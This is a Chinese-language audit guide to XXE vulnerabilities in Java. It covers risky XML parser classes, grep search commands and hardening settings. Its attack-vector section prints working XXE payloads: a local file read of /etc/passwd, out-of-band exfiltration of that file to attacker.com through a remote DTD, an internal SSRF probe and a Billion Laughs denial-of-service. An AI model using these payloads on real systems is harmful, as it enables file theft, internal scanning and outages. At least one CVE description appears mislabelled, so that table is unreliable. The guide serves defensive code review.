# Java XXE (XML External Entity) - 完整审计规则

> XML 外部实体注入漏洞深度分析

---

## 审计警告 - 常见遗漏点

```
1. 只检查核心模块，漏掉 plugins/extensions 中的 XML 解析
2. 看到有 setFeature 就认为安全，不验证是否设置了所有必要配置
3. 只搜索明显的解析器，漏掉 DomHelper 等包装类

!! 只设置 FEATURE_SECURE_PROCESSING 不够！
!! 必须显式设置 disallow-doctype-decl = true！
```

---

## 危险的 XML 解析类（完整清单）

| 解析类 | 包名 | 搜索命令 |
|--------|------|----------|
| `DocumentBuilder` | `javax.xml.parsers` | `grep -rn "DocumentBuilder"` |
| `SAXParser` | `javax.xml.parsers` | `grep -rn "SAXParser"` |
| `SAXReader` | `org.dom4j.io` | `grep -rn "SAXReader"` |
| `SAXBuilder` | `org.jdom2.input` | `grep -rn "SAXBuilder"` |
| `XMLReader` | `org.xml.sax` | `grep -rn "XMLReader"` |
| `XMLInputFactory` | `javax.xml.stream` | `grep -rn "XMLInputFactory"` |
| `TransformerFactory` | `javax.xml.transform` | `grep -rn "TransformerFactory"` |
| `Validator` | `javax.xml.validation` | `grep -rn "Validator\|SchemaFactory"` |
| `Unmarshaller` | `javax.xml.bind` | `grep -rn "Unmarshaller"` |
| `Digester` | `org.apache.commons.digester` | `grep -rn "Digester"` |
| `DomHelper` | 各框架自定义 | `grep -rn "DomHelper\|XmlHelper\|XmlUtil"` |

**默认都不安全** - 需要手动配置防御！

### 一次性搜索

```bash
grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory\|TransformerFactory\|SAXReader\|SAXBuilder\|XMLReader\|Digester\|DomHelper\|XmlHelper" --include="*.java"

# 检测防御配置
grep -rn "setFeature.*disallow-doctype\|external-general-entities" --include="*.java"

# XML Content-Type 端点
grep -rn "application/xml\|text/xml\|consumes.*xml" --include="*.java"
```

---

## 漏洞模式

```java
// ❌ 未配置防御
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
builder.parse(userInput);  // 用户可控 = XXE
```

---

## 攻击向量

### 1. 读取本地文件
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### 2. OOB 数据外带
```xml
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
    %remote; %send;
]>
```
远程 evil.dtd:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 3. 内网扫描 (SSRF)
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://192.168.1.1:80/">]>
<root>&xxe;</root>
```

### 4. 拒绝服务 (Billion Laughs)
```xml
<!DOCTYPE root [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<root>&lol2;</root>
```

---

## 防护配置完整性验证（缺一不可）

| 配置项 | 重要性 |
|--------|--------|
| `disallow-doctype-decl = true` | **关键！常被遗漏** |
| `external-general-entities = false` | 高 |
| `external-parameter-entities = false` | 高 |
| `load-external-dtd = false` | 高 |
| `setXIncludeAware(false)` | 中 |
| `setExpandEntityReferences(false)` | 中 |

---

## 相关 CVE

| CVE | 组件 | 描述 |
|-----|------|------|
| CVE-2017-5645 | Log4j 2.x | TcpSocketServer XXE |
| CVE-2017-12629 | Apache Solr | DocumentBuilder XXE |
| CVE-2018-1000058 | Jenkins | Config XML XXE |

---

## 审计教训

| 教训 | 说明 |
|------|------|
| 全面扫描 | 必须检查所有插件和依赖模块 |
| 防护清单 | 必须同时禁用 DOCTYPE 和外部实体 |
| 入口点分析 | 追踪所有接受 XML 输入的 HTTP 端点 |
